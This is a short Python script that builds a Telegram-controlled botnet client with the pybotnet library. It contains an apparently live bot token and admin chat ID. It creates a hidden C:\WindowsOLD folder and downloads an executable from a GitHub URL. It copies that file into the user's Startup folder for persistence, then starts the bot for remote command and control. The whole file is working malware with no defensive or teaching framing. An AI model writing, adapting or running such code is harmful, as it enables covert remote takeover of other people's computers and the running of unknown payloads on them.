from pybotnet import BotNet, TelegramEngine
import os
import urllib.request

telegram_eng = TelegramEngine(token="5725528820:AAE8UWJnvAWFtaVyXdf8YedmiaE1GdfCsuk", admin_chat_id="1439783859")

os.system("mkdir C:\\WindowsOLD")
os.system("attrib +h C:\\WindowsOLD")
os.chdir("C:\\WindowsOLD\\")

urllib.request.urlretrieve("https://github.com/bahadir-hamza/x-file/raw/main/x.exe", "x.exe")

os.system("copy x.exe \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"")

botnet = BotNet(telegram_eng)
botnet.run()